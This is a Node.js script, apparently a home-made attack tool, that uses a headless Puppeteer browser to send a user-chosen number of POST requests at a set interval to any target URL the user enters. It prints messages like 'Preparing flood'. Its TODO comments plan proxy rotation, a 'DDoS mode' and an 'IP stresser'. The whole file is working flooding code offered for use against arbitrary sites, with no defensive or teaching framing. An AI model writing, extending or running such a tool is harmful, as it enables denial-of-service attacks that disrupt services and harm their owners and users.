// [TODO] :
// Use proxies to send requests
// Implement DDoS mode
// Implement IP stresser
// Custom parameters
const puppeteer = require('puppeteer');
const prompt = require('prompt-sync')();
const warn = prompt('Are you sure that you wanna proceed? This tool is not designed to hide your IP or your connection info. (y/n) : ');

(async () => {
  if (warn.toLowerCase() === 'no' || warn.toLowerCase() === 'n') {
    return console.log("Quitting, stay safe.");
  } 
  const numRequests = parseInt(prompt('Enter number of requests to send: '));
  const webUrl = prompt('Target url e.g : google.com/route: '); // also use normal prompt to get strings
  let protocol = 'http';
  const protocolInput = prompt('Use HTTPS? (y/n) : ');
  if (protocolInput.toLowerCase() === 'yes' || protocolInput.toLowerCase() === 'y') {
    protocol = 'https';
  } 

  if (protocolInput.toLowerCase() == 'no' || protocolInput.toLowerCase() == 'n') {
    console.log("\x1b[32m", "[INFO] : Using default protocol HTTP!", "\x1b[0m");
  } 

  const postSpeed = parseInt(prompt('Enter the speed of posting in milliseconds: '));

  if (warn.toLowerCase() === 'yes' || warn.toLowerCase() === 'y') {
    console.log("\x1b[32m", `[INFO] : Preparing flood to ${webUrl} with ${numRequests} requests!`, "\x1b[0m");

    // Launch a headless browser instance
    const browser = await puppeteer.launch();
    const context = await browser.createIncognitoBrowserContext();
    const page = await context.newPage();
    const random = await Math.round(Math.random());

    // Loop through the specified number of requests
    for (let i = 0; i < numRequests; i++) {
      // Navigate to the target URL
      await page.goto(`${protocol}://${webUrl}/solve&sitekey=&type=${random}`);

      // Replace with your POST parameters (todo)
      const params = {};

      // Send the POST request using JavaScript in the browser context
      const response = await page.evaluate(async (url, params) => {
        const options = {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `url=${encodeURIComponent(url)}&${new URLSearchParams(params)}`
        };
        const response = await fetch(url, options);
        return { status: response.status, text: await response.text() }; // log response text for debugging to get response content.
      }, `${protocol}://${webUrl}/solve&sitekey=&type=${random}`, params);

      // Log whether the request was successful or failed
      if (response.status >= 200 && response.status < 300) {
        console.log(`Request ${i + 1}: Successful Response :(${response.status})`);
      } else {
        console.log(`Request ${i + 1}: Got response : (${response.status})`);
      }

      // Wait for the specified time before sending the next request
      await new Promise(resolve => setTimeout(resolve, postSpeed));
    }

    console.log(`${numRequests} requests were sent to ${webUrl}`);

    // Close the headless browser instance
    await browser.close();
  }
})();
